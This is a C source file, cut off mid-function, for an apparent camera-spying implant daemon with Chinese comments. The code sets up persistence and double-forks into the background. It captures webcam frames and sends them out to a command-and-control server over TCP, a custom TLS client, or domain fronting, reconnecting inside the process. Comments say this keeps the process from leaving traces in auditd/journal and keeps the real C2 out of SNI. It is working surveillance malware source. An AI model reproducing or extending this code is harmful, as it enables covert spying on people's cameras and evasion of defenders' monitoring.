/*
 * agent_windows/src/cam_daemon.c
 *
 * 摄像头常驻守护实现。见 include/cam_daemon.h 的分工说明。
 *
 * 刻意不引入任何 Windows API：驻留走 persist_linux_ensure（Linux 真实
 * 实现），采集走 camera.h 工厂，回传走 21_exfil。因此本文件能在 Linux
 * 下被真实编译、真实执行 —— 不是等上机才能验证的纸面代码。
 */

/* clock_gettime / CLOCK_MONOTONIC 在 -std=c99 -pedantic 下不暴露：
 * glibc 需要特性测试宏，且必须在任何 include 之前定义（与 cam_linux_v4l2.c
 * 同源的坑）。缺了它报的是 "CLOCK_MONOTONIC undeclared"，与真实逻辑无关，
 * 却会让人误以为是时钟源选错了。 */
#ifndef _DEFAULT_SOURCE
#define _DEFAULT_SOURCE 1
#endif

#include "cam_daemon.h"

#include "camera.h"
#include "implant.h"
#include "persist.h"

#include "exfil.h"
#include "exfil_link.h"
#include "p2p_cell.h"

/* 自研 TLS 1.2 客户端。仅在 sink 是 tls:// 时使用，但无条件包含——
 * 若做成编译期可选，默认路径就永远不被测试覆盖，那是恒绿的温床。 */
#include "tls.h"

/* 域前置 HTTP 层（24_front）。它自己持有 tls_ctx 并自握手，本文件在
 * front:// 模式下只提供 send/recv 回调，不再单独调 cd_tls_handshake——
 * 两处都握手会让 TLS 记录层叠两层，握手必然失败。 */
#include "front.h"

#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>

/* 内置测试密钥：仅当 cfg 未指定时使用。部署必须显式配置。 */
static const uint8_t DEF_K_SEND[16] = {
    0x0b,0x1c,0x2d,0x3e,0x4f,0x50,0x61,0x72,
    0x83,0x94,0xa5,0xb6,0xc7,0xd8,0xe9,0xfa
};
static const uint8_t DEF_K_RECV[16] = {
    0xf0,0xe1,0xd2,0xc3,0xb4,0xa5,0x96,0x87,
    0x78,0x69,0x5a,0x4b,0x3c,0x2d,0x1e,0x0f
};
static const uint8_t DEF_PFX[8] = { 0xaa,0xbb,0xcc,0xdd,0xee,0xff,0x00,0x11 };

/* ---- 停止信号 ---- */
static volatile sig_atomic_t g_stop = 0;
static implant_t * volatile  g_im   = NULL;

void cam_daemon_request_stop(void) { g_stop = 1; }

static void cd_on_signal(int sig)
{
    (void)sig;
    /* 只置标志 + 置 implant 停止位。两者都是单标志赋值，
     * 不做 malloc / IO / 加锁，保证在信号处理器里调用是安全的。 */
    g_stop = 1;
    if (g_im) implant_stop(g_im);
}

/* ---- 微秒时钟 ---- */
static uint64_t cd_now_us(void *ud)
{
    (void)ud;
    struct timespec ts;
    if (clock_gettime(CLOCK_MONOTONIC, &ts) != 0) {
        return (uint64_t)time(NULL) * 1000000ULL;
    }
    return (uint64_t)ts.tv_sec * 1000000ULL + (uint64_t)ts.tv_nsec / 1000ULL;
}

/*
 * 从 JPEG 码流解析宽高。
 *
 * 为什么需要：implant 的 pack 回调签名只有 (in, in_len)，拿不到
 * cam_frame_t 的 width/height。改 implant 接口会牵动全部既有测试；
 * 而从 SOF 标记解析是 JPEG 规范内的确定行为，零副作用。
 *
 * 返回 0 成功；-1 非法 / 未找到 SOF。
 */
static int cd_jpeg_dims(const uint8_t *d, size_t n, uint32_t *w, uint32_t *h)
{
    if (!d || n < 4 || d[0] != 0xFF || d[1] != 0xD8) return -1;

    size_t i = 2;
    while (i + 9 <= n) {
        if (d[i] != 0xFF) { i++; continue; }

        uint8_t m = d[i + 1];
        /* 无长度字段的独立标记 */
        if (m == 0x01 || (m >= 0xD0 && m <= 0xD7)) { i += 2; continue; }
        if (m == 0xD8) { i += 2; continue; }
        if (m == 0xD9) return -1;                    /* EOI 先于 SOF */

        size_t seglen = ((size_t)d[i + 2] << 8) | (size_t)d[i + 3];
        if (seglen < 2 || i + 2 + seglen > n) return -1;

        /* SOFn：C4/D8/D9/DA 之外的 SOF 家族成员 */
        if ((m >= 0xC0 && m <= 0xC3) || (m >= 0xC5 && m <= 0xC7) ||
            (m >= 0xC9 && m <= 0xCB) || (m >= 0xCD && m <= 0xCF)) {
            if (i + 9 > n) return -1;
            *h = ((uint32_t)d[i + 5] << 8) | (uint32_t)d[i + 6];
            *w = ((uint32_t)d[i + 7] << 8) | (uint32_t)d[i + 8];
            return 0;
        }
        if (m == 0xDA) return -1;                    /* SOS 先于 SOF */
        i += 2 + seglen;
    }
    return -1;
}

/* ---- 回传上下文 ---- */
typedef struct {
    exfil_chan_t chan;
    int          sink_fd;
    int          sink_owned;   /* 1 = 本进程 open，退出时 close */
    int          is_sock;      /* 1 = socket fd，走 send(MSG_NOSIGNAL) */
    uint64_t     seq;
    uint64_t     bytes_out;
    uint32_t     batches;
    const char  *name;
    int          last_err;

    /* tcp:// 重连所需。仅当 spec 是 tcp:// 时填充。
     *
     * 为何必须进程内重连：
     *   边采边发时 C2 断线是常态（网络抖动、C2 重启、目标机休眠唤醒）。
     *   若依赖 systemd 的 Restart=always 兜底，代价是——
     *     1) 断线期间已采集的帧随进程退出全部丢失；
     *     2) 每次断线都产生一次进程启停，在 auditd/journal 里留下可关联痕迹；
     *     3) RestartSec 期间采集完全停摆。
     *   进程内重连只丢"正在写的那一批"，且不留启停记录。 */
    char         host[256];
    char         port[16];
    uint32_t     reconnects;   /* 成功重连次数，供 status 观测 */

    /* TLS 出口状态。tls != NULL 表示本出口跑在 TLS 记录层之上。
     *
     * tls_handshakes 与 reconnects 分开计数：TCP 重连成功但握手失败是
     * 一种独立的故障形态（例如对端证书过期、或中间人只转发不握手）。
     * 只记 reconnects 会让这种故障看起来像"重连正常但没数据"。 */
    tls_ctx     *tls;
    char         sni[256];
    char         ca[4096];
    int          verify;
    uint32_t     tls_handshakes;

    /* "是否 TLS 出口"与"当前是否有 ctx"必须是两个字段。
     *
     * 握手失败时 tls 会被置 NULL（见 cd_tls_handshake），若只靠 tls 判
     * 断出口类型，一次握手失败就会把 tls:// 出口静默降级成明文——
     * 后续帧全部以明文发出，而代码里没有任何一处会再想起它是 TLS。
     * 配置态与运行态分离，正是为了堵这个降级通道。 */
    int          use_tls;

    /* 域前置层状态。front != NULL 时实际写路径是 front_send（内部走
     * front 自己持有的 TLS），本结构的 tls 字段保持 NULL——两者同时非
     * NULL 意味着记录层叠了两层，握手必然失败。 */
    front_ctx   *front;
    int          use_front;
    char         front_host[256];   /* 真实目标，进内层 Host */
    char         front_path[256];
} cd_sink_t;

/* 前向声明：cd_write_all 定义在前，写失败时要回调重连。 */
static int cd_sink_reconnect(cd_sink_t *s);
static int cd_tls_handshake(cd_sink_t *s);

/* ---- TLS 记录层的 IO 回调 ----
 *
 * 25_tls 把 IO 做成回调注入，因此同一套 TLS 实现可以跑在 socket、
 * 代理隧道或域前置层之上。这里注入的就是 camd 自己的 sink fd。
 *
 * 返回值必须是**实际发出的字节数**，不是 0/-1 的成功失败标志。
 *
 * 这一条与 tls.h 顶部的注释相反，实测踩过：tls.h 写"发送：返回 0 成功"，
 * 但 tls.c 的 io_send_all 是 `off += (size_t)r; if (r <= 0) return
 * TLS_ERR_IO;` —— 把返回值当字节数累加。照注释返回 0 的结果是：第一次
 * 发送（5 字节记录头）刚成功，就地被判 IO 错误，握手报 transport error，
 * 而对端只看到连接被关掉（SSLEOFError）。既有实现 test_tls.c:45 返回的
 * 是字节数，那才是真契约。
 *
 * send 必须用 MSG_NOSIGNAL：对端关闭后裸 send 触发 SIGPIPE 会直接杀死
 * 常驻进程（该信号已在 tcp:// 分支里 SIG_IGN，此处双保险——若有人把
 * 那处 SIG_IGN 挪走，这里仍然安全）。 */
static int cd_tls_send(void *arg, const uint8_t *data, size_t len)
{
    cd_sink_t *s = (cd_sink_t *)arg;
    if (!s || s->sink_fd < 0) return -1;
    ssize_t n = send(s->sink_fd, data, len, MSG_NOSIGNAL);
    return (int)n;              /* <=0 由 io_send_all 判为失败 */
}

/* 契约：返回读到的字节数，<=0 视为失败/关闭。
 * recv 返回 0 即对端 FIN，正好落进这个语义，无需额外分支。 */
static int cd_tls_recv(void *arg, uint8_t *buf, size_t cap)
{
    cd_sink_t *s = (cd_sink_t *)arg;
    if (!s || s->sink_fd < 0 || cap == 0) return -1;
    ssize_t n = recv(s->sink_fd, buf, cap, 0);
    return (int)n;
}

/*
 * 在已建立的 TCP 之上完成 TLS 握手。可重入：会先释放上一次的 ctx。
 *
 * 重连后**必须**重新握手——TLS 会话状态绑在连接上，复用旧 ctx 写新
 * socket 会产出对端无法解密的记录；更坏的情况是 tls_write 静默成功，
 * 表现为"在发但 C2 一帧都收不到"。
 */
static int cd_tls_handshake(cd_sink_t *s)
{
    if (!s) return -1;
    if (s->sink_fd < 0) return -1;

    if (s->tls) { tls_free(s->tls); s->tls = NULL; }

    tls_config cfg;
    memset(&cfg, 0, sizeof cfg);
    cfg.sni         = s->sni[0] ? s->sni : NULL;
    cfg.verify_host = s->sni[0] ? s->sni : NULL;
    cfg.ca_path     = s->ca[0]  ? s->ca  : NULL;
    cfg.verify      = s->verify;
    cfg.alpn        = NULL;      /* 信元是裸流，不跑 HTTP/2 */

    tls_err e = tls_client_init(&s->tls, &cfg, cd_tls_send, cd_tls_recv, s);
    if (e != TLS_OK || !s->tls) {
        fprintf(stderr, "[FATAL] TLS 客户端初始化失败: %s\n", tls_errstr(e));
        s->tls = NULL;
        return -1;
    }

    e = tls_handshake(s->tls);
    if (e != TLS_OK) {
        fprintf(stderr, "[FATAL] TLS 握手失败: %s\n", tls_errstr(e));
        tls_free(s->tls);
        s->tls = NULL;
        return -1;
    }
    s->tls_handshakes++;
    return 0;
}

/*
 * 写出信元。
 *
 * 必须区分 socket 与常规文件：链路层 exfil_link_write_all 用的是
 * send(fd, …, MSG_NOSIGNAL)，在**常规文件 fd 上返回 ENOTSOCK**。
 * 这是真实的集成约束 —— 直接用它写文件，每一帧都会静默失败，
 * 而上层只看到"回传失败"，看不出是 fd 类型不匹配。
 *
 * socket 路径坚持用链路层而非裸 write：MSG_NOSIGNAL 是必需的，
 * 对端关闭时裸 write 会触发 SIGPIPE 直接杀死常驻进程。
 */
static int cd_write_all(cd_sink_t *s, const uint8_t *buf, size_t n)
{
    if (!s || s->sink_fd < 0) return -1;

    /* TLS 出口：写的是 TLS 记录，不是裸字节。
     *
     * 顺序要紧——必须先判 tls 再判 is_sock，否则 TLS 出口会走成明文
     * send()，把记录层绕过。那时的现象极具误导性：C2 收到的前几个
     * 字节恰好是 ClientHello，但后续全是裸信元，握手永远完不成，
     * 而 camd 侧看起来"写成功了"。 */
    /* 域前置出口：写的是 HTTP 请求（front 内部再走它自己的 TLS），不是
     * 裸信元也不是裸 TLS 记录。此分支必须排在 tls 之前——front 模式下
     * s->tls 恒为 NULL（ctx 在 front 内部），若误入 TLS 分支就等于把
     * 明文信元直接 send() 出去，前置层被整层绕过。 */
    if (s->front) {
        if (front_send(s->front, buf, n) == FRONT_OK) return 0;

        if (s->host[0] && cd_sink_reconnect(s) == 0 && s->front)
            return (front_send(s->front, buf, n) == FRONT_OK) ? 0 : -1;
        return -1;
    }

    if (s->tls) {
        if (tls_write(s->tls, buf, n) == TLS_OK) return 0;

        /* 写失败 → 重连（cd_sink_reconnect 内部会重新握手）后重试一次。
         * 与明文分支同理由：只重试一次，下一批采集会自然再试。 */
        if (s->host[0] && cd_sink_reconnect(s) == 0 && s->tls)
            return (tls_write(s->tls, buf, n) == TLS_OK) ? 0 : -1;
        return -1;
    }

    if (s->is_sock) {
        if (exfil_link_write_all(s->sink_fd, buf, n) == 0) return 0;

        /* 写失败且是 tcp:// 出口 → 进程内重连后重试一次。
         *
         * 只重试一次，不做循环：下一批采集会自然再试（采集循环自带
         * interval_ms 节拍），在此处自旋只会空转 CPU 并放大网络压力。
         * 代价是断开期间这一批帧丢失——可接受，因为重连成功后的批次
         * 立即恢复，而 systemd 重启方案丢的是整段重启窗口。 */
        if (s->host[0] && cd_sink_reconnect(s) == 0)
            return exfil_link_write_all(s->sink_fd, buf, n);
        return -1;
    }

    size_t off = 0;
    while (off < n) {
        ssize_t w = write(s->sink_fd, buf + off, n - off);
        if (w < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (w == 0) return -1;          /* 不应发生；防死循环 */
        off += (size_t)w;
    }
    return 0;
}

static int cd_pack(const uint8_t *in, size_t in_len,
                   uint8_t *out, size_t *out_len, void *ud)
{
    cd_sink_t *s = (cd_sink_t *)ud;
    if (!s || !in || !out || !out_len) return -1;

    uint32_t w = 0, h = 0;
    if (cd_jpeg_dims(in, in_len, &w, &h) != 0) {
        /* 解析不出尺寸不阻断回传：宽高是元数据，帧本体仍然有效。
         * 置 0 由接收侧按"未知"处理，好过为了元数据丢掉一整帧。 */
        w = 0; h = 0;
    }

    exfil_rec_t r;
    memset(&r, 0, sizeof r);
    r.type    = EXF_TYPE_CAMERA_JPEG;
    r.seq     = s->seq++;
    r.ts_us   = cd_now_us(NULL);
    r.width   = w;
    r.height  = h;
    r.flags   = EXF_FLAG_KEYFRAME | EXF_FLAG_LAST;
    r.payload = in;
    r.plen    = in_len;
    if (s->name) snprintf(r.name, sizeof r.name, "%s", s->name);

    size_t ncells = 0;
    if (exfil_send_cells(&r, &ncells) != 0) return -1;

    size_t need = ncells * (size_t)P2P_CELL_WIRE;
    if (*out_len < need) { *out_len = need; return -2; }   /* 容量不足，回填所需 */

    size_t got = 0;
    if (exfil_chan_send(&s->chan, &r, out, *out_len, &got) != 0) return -3;

    *out_len = need;
    return 0;
}

static int cd_exfil(const uint8_t *data, size_t len, const char *name, void *ud)
{
    cd_sink_t *s = (cd_sink_t *)ud;
    (void)name;
    if (!s || !data || len == 0) return -1;
    if (s->sink_fd < 0) { s->last_err = -1; return -1; }

    if (cd_write_all(s, data, len) != 0) {
        s->last_err = errno ? -errno : -1;
        return -1;
    }
    s->bytes_out += len;
    s->batches++;
    return 0;
}

/* ---- tcp:// 边采边发 ----
 *
 * 背景：此前唯一可用的实时出口是 fd://N（父进程传入已打开的 fd）。这要求
 * 部署方自己先建好连接再传进来，C2 一断就只能靠外部重启——见 cd_sink_t
 * 里 reconnects 字段的注释。tcp:// 让 camd 自己建连、自己续连。
 */

/*
 * 解析 "host:port"（scheme 前缀已由调用方剥离）。
 *
 * tcp:// 与 tls:// 共用本函数：两者前缀同为 6 字符，剥离后格式一致。
 * 不在这里判 scheme —— 判定属于 sink_open 的分派逻辑，混进来会让本函数
 * 无法被第二个 scheme 复用。
 *
 * IPv6 字面量含冒号，用 strrchr 取最后一个冒号而不是 strchr 取第一个，
 * 否则 "[::1]:9000" 会被切成 host="[" port="::1]:9000"。
 * 支持 "[::1]:9000" 的方括号形式，剥掉方括号后再交给 getaddrinfo。
 */
static int cd_parse_hostport(const char *hp, char *host, size_t hcap,
                             char *port, size_t pcap)
{
    if (!*hp) return -1;

    const char *colon = strrchr(hp, ':');
    if (!colon || colon == hp || !colon[1]) return -1;

    size_t plen = strlen(colon + 1);
    if (plen >= pcap) return -1;

    const char *hs = hp;
    size_t hlen = (size_t)(colon - hp);
    if (hlen >= 2 && hs[0] == '[' && colon[-1] == ']') {
        hs += 1;
        hlen -= 2;                 /* 剥掉方括号 */
    }
    if (hlen == 0 || hlen >= hcap) return -1;

    memcpy(host, hs, hlen); host[hlen] = '\0';
    memcpy(port, colon + 1, plen); port[plen] = '\0';
    return 0;
}

/*
 * 判定 host 是否为 IP 字面量（IPv4 点分十进制或 IPv6 含冒号）。
 *
 * 用途：RFC 6066 明确禁止在 SNI 里填 IP 字面量。因此目标是 IP 时不能
 * 拿它去当 SNI，也不能用它做证书主机名校验——那种情况下"校验"要么
 * 恒失败，要么被实现悄悄跳过，两种都不是我们想要的结果。
 */
static int cd_is_ip_literal(const char *h)
{
    if (!h || !*h) return 0;
    if (strchr(h, ':')) return 1;               /* IPv6 */
    int dots = 0;
    for (const char *p = h; *p; p++) {
        if (*p == '.') { dots++; continue; }
        if (*p < '0' || *p > '9') return 0;
    }
    return dots == 3;                            /* IPv4 */
}

/* 建一条 TCP 连接。成功返回 fd，失败返回 -1。 */
static int cd_tcp_connect(const char *host, const char *port)
{
    struct addrinfo hints, *res = NULL, *ai = NULL;
    memset(&hints, 0, sizeof hints);
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family   = AF_UNSPEC;      /* 同时接受 v4/v6，由 getaddrinfo 排序 */

    if (getaddrinfo(host, port, &hints, &res) != 0) return -1;

    int fd = -1;
    for (ai = res; ai; ai = ai->ai_next) {
        fd = socket(ai->ai_family, ai->ai_socktype, ai->ai_protocol);
        if (fd < 0) continue;

        /* TCP_NODELAY：信元是 512 字节级小包，Nagle 会攒包，把实时回传
         * 变成"攒够一批才发"。 */
        int one = 1;
        (void)setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof one);

        /* SO_KEEPALIVE：对端主机断电/断网时本机不会收到 FIN，连接会一直
         * 挂着，写入也不报错——表现为"在跑但零产出"。保活让它最终报错，
         * 从而触发下面的进程内重连。 */
        (void)setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof one);

        if (connect(fd, ai->ai_addr, ai->ai_addrlen) == 0) break;
        close(fd); fd = -1;
    }
    freeaddrinfo(res);
    return fd;
}

/*
 * 重连：关掉旧 fd，重新建连。
 *
 * 失败即返回 -1，由调用方决定重试节奏。刻意不做无限重试——采集循环本身
 * 有节拍（interval_ms），下一批会自然再试，无需在此处自旋空转 CPU。
 */
static int cd_sink_reconnect(cd_sink_t *s)
{
    if (!s->host[0]) return -1;          /* 非 tcp:// 出口，无重连语义 */
    if (s->sink_owned && s->sink_fd >= 0) close(s->sink_fd);
    s->sink_fd = -1;

    int fd = cd_tcp_connect(s->host, s->port);
    if (fd < 0) return -1;

    s->sink_fd   = fd;
    s->sink_owned = 1;
    s->is_sock   = 1;

    /* TLS 会话绑在连接上：新 TCP 必须重新握手，不能沿用旧 ctx。 */
    if (s->use_tls && cd_tls_handshake(s) != 0) return -1;

    /* 域前置：front 内部的 TLS 同样绑在旧连接上，只换 fd 不重建整层的话，
     * front_send 仍走旧 ctx，在新 socket 上写失败而 TCP 层看起来是好的——
     * 表现为"重连成功但零产出"，且没有任何一处报错。 */
    if (s->use_front) {
        if (s->front) { front_free(s->front); s->front = NULL; }
        front_config fc;
        memset(&fc, 0, sizeof fc);
        fc.front_domain = s->host;
        fc.real_host    = s->front_host;
        fc.path_prefix  = s->front_path[0] ? s->front_path : NULL;
        fc.ca_path      = s->ca[0] ? s->ca : NULL;
        fc.verify       = s->verify;
        fc.http2        = 0;
        if (front_init(&s->front, &fc, cd_tls_send, cd_tls_recv, s) != FRONT_OK) {
            s->front = NULL;
            return -1;
        }
        if (front_connect(s->front) != FRONT_OK) {
            front_free(s->front); s->front = NULL;
            return -1;
        }
    }

    s->reconnects++;
    return 0;
}

/* ---- sink 打开：支持 fd://N、tcp://host:port 与文件路径 ---- */
static int cd_sink_open(const char *spec, cd_sink_t *s)
{
    s->sink_fd = -1;
    s->sink_owned = 0;
    if (!spec) return 0;                 /* NULL = 不回传（仅测试） */

    if (strncmp(spec, "fd://", 5) == 0) {
        long n = strtol(spec + 5, NULL, 10);
        if (n < 0 || n > 65535) return -1;
        s->sink_fd = (int)n;
        s->sink_owned = 0;               /* 不属于本进程，绝不 close */
        return 0;
    }

    /* "tcp://" 与 "tls://" 前缀同为 6 字符，共用 host:port 解析；
     * "front://" 是 8 字符，指向的是**前置域**而非真实 C2。 */
    int is_tls   = (strncmp(spec, "tls://", 6) == 0);
    int is_front = (strncmp(spec, "front://", 8) == 0);
    const char *hp = is_front ? spec + 8 : spec + 6;
    if (strncmp(spec, "tcp://", 6) == 0 || is_tls || is_front) {
        if (cd_parse_hostport(hp, s->host, sizeof s->host,
                              s->port, sizeof s->port) != 0) return -1;

        /* front:// 的三条配置守卫必须排在**建连之前**。
         *
         * 配置错误不该先往外连一次：那会在目标机的网络日志里留下一条指向
         * 前置域的连接，而这次连接本不该发生。更重要的是——若先建连，守卫
         * 在读不到服务时永远走不到，测试会拿"连接失败"冒充"守卫生效"。 */
        if (is_front) {
            /* 守卫 C：front_host 必填，绝不从前置域推导。
             *
             * 推导出来的两者恒等，于是请求照样发、响应照样收、连通性全绿，
             * 唯独真实目标以明文 SNI 出现在链路上——前置能力归零而无人察觉。
             * 这是本层最坏的失效形态，因此宁可拒绝启动也不给缺省值。 */
            if (!s->front_host[0]) {
                fprintf(stderr, "[FATAL] front:// 出口必须指定 --front-host（真实目标）\n");
                return -1;
            }

            /* 守卫 D：两个域名不得相同。front_init 只校验非空，不校验不等
             * —— 层内放行"两者相同"，因为对 front 层自身而言那仍能连通。
             * 但在部署语义上那等于没前置，必须在此挡住。 */
            if (strcmp(s->front_host, s->host) == 0) {
                fprintf(stderr, "[FATAL] --front-host 与前置域相同（%s）："
                                "域前置形同虚设，真实目标会明文出现在 SNI 里\n",
                        s->host);
                return -1;
            }

            /* 同 TLS 守卫 A：要求校验却无信任库 = 可被自签证书冒充。 */
            if (s->verify && !s->ca[0]) {
                fprintf(stderr, "[FATAL] front:// 出口要求校验证书，但未指定 --ca\n");
                return -1;
            }

        }

        /* SIGPIPE 必须忽略。
         *
         * 不是理论风险：C2 进程退出后，本机第一次写入收到 RST，第二次
         * 写入触发 SIGPIPE，默认动作是**杀死进程**。于是"对端重启一次"
         * 就等于"植入体静默消失"，而 systemd 的 Restart=always 会把它
         * 拉起来——表面上自愈了，实际丢了一批帧且留下了启停记录。
         * 忽略后写入返回 EPIPE，交给下面的进程内重连处理。 */
        signal(SIGPIPE, SIG_IGN);

        int fd = cd_tcp_connect(s->host, s->port);
        if (fd < 0) return -1;
        s->sink_fd    = fd;
        s->sink_owned = 1;
        s->is_sock    = 1;

        if (is_tls) {
            s->use_tls = 1;

            /* 守卫 A：要求校验证书却没有信任库 → 拒绝启动。
             *
             * 不校验的 TLS 只防被动流量识别，不防主动冒充：任何人都能用
             * 自签证书接管连接，让植入体把画面持续发给自己（内容它解不
             * 开，但能测出哪些主机在线，并形成黑洞）。因此"不校验"必须
             * 是显式选择，而不是"忘了给 --ca"的默认值。 */
            if (s->verify && !s->ca[0]) {
                fprintf(stderr, "[FATAL] tls:// 出口要求校验证书，但未指定 --ca\n");
                return -1;
            }

            /* SNI 未显式给定时从 host 推导（IP 字面量不可作 SNI）。 */
            if (!s->sni[0] && !cd_is_ip_literal(s->host))
                snprintf(s->sni, sizeof s->sni, "%s", s->host);

            /* 守卫 B：要求主机名校验却拿不出主机名 → 拒绝启动。
             * 否则要么校验恒失败（连不上），要么被实现静默跳过（等于
             * 没校验却以为校验了）——后者最坏。 */
            if (s->verify && !s->sni[0]) {
                fprintf(stderr, "[FATAL] tls:// 出口要求主机名校验，但目标是 IP"
                                " 字面量且未指定 --sni\n");
                return -1;
            }

            if (cd_tls_handshake(s) != 0) return -1;
        }

        if (is_front) {
            s->use_front = 1;

            front_config fc;
            memset(&fc, 0, sizeof fc);
            fc.front_domain = s->host;                    /* 进 SNI，观察者可见 */
            fc.real_host    = s->front_host;              /* 进内层 Host */
            fc.path_prefix  = s->front_path[0] ? s->front_path : NULL;
            fc.ca_path      = s->ca[0] ? s->ca : NULL;
            fc.verify       = s->verify;
            fc.http2        = 0;

            front_err fe = front_init(&s->front, &fc, cd_tls_send, cd_tls_recv, s);
            if (fe != FRONT_OK) {
                fprintf(stderr, "[FATAL] front_init 失败: %s\n", front_errstr(fe));
                return -1;
            }
            fe = front_connect(s->front);
            if (fe != FRONT_OK) {
                fprintf(stderr, "[FATAL] front_connect 失败: %s\n", front_errstr(fe));
                front_free(s->front);
                s->front = NULL;
                return -1;
            }
        }
        return 0;
    }

    int fd = open(spec, O_WRONLY | O_CREAT | O_APPEND, 0600);
    if (fd < 0) return -1;
    s->sink_fd = fd;
    s->sink_owned = 1;
    s->is_sock = 0;
    return 0;
}

/* 判定 fd 是否为 socket。用于选择 send(MSG_NOSIGNAL) 还是 write()。 */
static int cd_fd_is_socket(int fd)
{
    struct stat st;
    if (fd < 0) return 0;
    if (fstat(fd, &st) != 0) return 0;
    return S_ISSOCK(st.st_mode) ? 1 : 0;
}

static void cd_sink_close(cd_sink_t *s)
{
    /* 先发 close_notify，再关 fd，最后释放 ctx。
     *
     * 顺序反了（或干脆不发）的后果在 tls.h 里写明了：对端只能看到 TCP
     * 被关掉，真实实现会报 "unexpected eof while reading" 并把整条连接
     * 判为异常结束——握手、应用数据全对，整段会话仍被记为错误。
     * c2_sink.py 侧表现为该连接被记成读异常，而字节其实都收到了。 */
    if (s->front) {
        /* front 内部持有自己的 tls_ctx，必须先发 close_notify 再释放。
         *
         * 此前这里直接 front_free，24_front 未暴露 close 接口，于是
         * front:// 出口下正常退出时 C2 侧把连接记成 unexpected eof——
         * 字节都收到，却被判为异常结束，与下面 tls:// 分支不对称。
         * 现在 front_close 已存在，两条出口行为一致。 */
        (void)front_close(s->front);
        front_free(s->front);
        s->front = NULL;
    }
    if (s->tls) {
        (void)tls_close(s->tls);
        tls_free(s->tls);
        s->tls = NULL;
    }
    if (s->sink_owned && s->sink_fd >= 0) close(s->sink_fd);
    s->sink_fd = -1;
    s->sink_owned = 0;
}

/* ---- pid 文件 ---- */
static int cd_write_pid(const char *path)
{
    if (!path) return 0;
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) return -1;
    char b[32];
    int n = snprintf(b, sizeof b, "%ld\n", (long)getpid());
    ssize_t w = write(fd, b, (size_t)n);
    close(fd);
    return (w == (ssize_t)n) ? 0 : -1;
}

/* ---- 守护进程化 ---- */
static int cd_daemonize(void)
{
    pid_t p = fork();
    if (p < 0) return -1;
    if (p > 0) _exit(0);                 /* 父进程立即退出 */

    if (setsid() < 0) return -1;

    /* 二次 fork：确保不是 session leader，永不重新获得控制终端 */
    p = fork();
    if (p < 0) return -1;
    if (p > 0) _exit(0);

    if (chdir("/") != 0) return -1;
    umask(077);

    int devnull = open("/dev/null", O_RDWR);
    if (devnull >= 0) {
        dup2(devnull, STDIN_FILENO);
        dup2(devnull, STDOUT_FILENO);
        dup2(devnull, STDERR_FILENO);
        if (devnull > 2) close(devnull);
    }
    return 0;
}

/* ---- 主入口 ---- */
int cam_daemon_run(const cam_daemon_cfg_t *cfg, cam_daemon_stats_t *out_stats)
{
    cam_daemon_stats_t st;
    memset(&st, 0, sizeof st);
    st.persist_rc = -9;                  /* -9 = 未执行，区别于 -1 失败 */

    if (!cfg) { if (out_stats) *out_stats = st; return -1; }

    /* 1) 驻留：先于 daemonize，使失败能在调用方终端上可见 */
    if (cfg->ensure_persist) {
        st.persist_rc = persist_linux_ensure(cfg->root_prefix,
                                             st.bin_path, sizeof st.bin_path,
                                             st.methods, CAM_DAEMON_PERSIST_N);
        if (st.persist_rc < 0) {
            if (out_stats) *out_stats = st;
            return -2;
        }
    }

    /* 2) 回传通道 + sink */
    const uint8_t *ks = cfg->k_send ? cfg->k_send : DEF_K_SEND;
    const uint8_t *kr = cfg->k_recv ? cfg->k_recv : DEF_K_RECV;
    const uint8_t *pf = cfg->pfx     ? cfg->pfx    : DEF_PFX;

    cd_sink_t sink;
    memset(&sink, 0, sizeof sink);
    sink.name = "camera";

    /* TLS 出口参数。仅当 sink_path 是 tls:// 时被 cd_sink_open 取用；
     * 明文出口下这些字段被忽略，不为零也不影响既有路径。 */
    if (cfg->tls_ca)  snprintf(sink.ca,  sizeof sink.ca,  "%s", cfg->tls_ca);
    if (cfg->tls_sni) snprintf(sink.sni, sizeof sink.sni, "%s", cfg->tls_sni);
    sink.verify = cfg->tls_verify;

    /* 域前置参数。front_host 故意没有缺省推导：能从前置域推出来就意味着
     * 两者同源，而那正是域前置要防的失效（见 cam_daemon.h 的说明）。 */
    if (cfg->front_host) snprintf(sink.front_host, sizeof sink.front_host,
                                  "%s", cfg->front_host);
    if (cfg->front_path) snprintf(sink.front_path, sizeof sink.front_path,
                                  "%s", cfg->front_path);

    if (exfil_chan_init(&sink.chan, ks, kr, pf, 0) != 0) {
        if (out_stats) *out_stats = st;
        return -4;
    }
    if (cd_sink_open(cfg->sink_path, &sink) != 0) {
        exfil_chan_wipe(&sink.chan);
        if (out_stats) *out_stats = st;
        return -4;
    }
    /* fd://N 传入的 fd 类型未知（可能是 socket 也可能是文件），必须实测。
     * 判错会让 send() 在文件上 ENOTSOCK，每一帧都静默丢弃。 */
    sink.is_sock = cd_fd_is_socket(sink.sink_fd);

    /* 3) 采集编排 */
    implant_cfg_t ic;
    memset(&ic, 0, sizeof ic);
    ic.cam.width      = cfg->width;
    ic.cam.height     = cfg->height;
    ic.cam.fps        = cfg->fps;
    ic.cam.capture_ms = cfg->capture_ms;
    ic.cam.max_frames = cfg->frames_per_batch;
    ic.cam.prefer_mjpeg = true;
    ic.interval_ms      = cfg->interval_ms;
    ic.jitter_ms        = cfg->jitter_ms;
    ic.max_batches      = cfg->max_batches;
    ic.frames_per_batch = cfg->frames_per_batch;
    ic.jpeg_quality     = cfg->jpeg_quality;
    ic.stop_on_error    = false;   /* 常驻进程：单批失败不应终止整个守护 */
    ic.run_defend       = cfg->run_defend ? true : false;

    implant_t *im = implant_create(&ic, cfg->backend);
    if (!im) {
        cd_sink_close(&sink);
        exfil_chan_wipe(&sink.chan);
        if (out_stats) *out_stats = st;
        return -3;
    }

    implant_set_now(im, cd_now_us, NULL);
    implant_set_pack(im, cd_pack, &sink);
    implant_set_exfil(im, cd_exfil, &sink);

    /* 4) 信号：daemonize 之后安装，避免被父进程的处置方式影响 */
    g_im = im;
    struct sigaction sa;
    memset(&sa, 0, sizeof sa);
    sa.sa_handler = cd_on_signal;
